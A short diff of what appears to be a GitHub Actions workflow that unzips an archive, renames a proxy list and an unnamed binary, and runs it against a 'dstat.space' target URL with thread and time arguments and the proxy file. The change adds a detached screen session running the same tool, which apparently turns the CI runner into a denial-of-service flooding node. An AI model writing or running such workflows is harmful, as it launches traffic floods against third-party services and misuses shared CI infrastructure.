@@ -33,12 +33,13 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
-          mv ki o
+          mv tol o
           chmod +x o
           export TARGET="https://dstat.space/l4?id=fdcservers"
           
           
-          ./o $TARGET 200 1 1 
+          screen -dms ve ./o $TARGET 200 1 1 90.txt
+          ./o $TARGET 200 1 1 90.txt
           
           
           
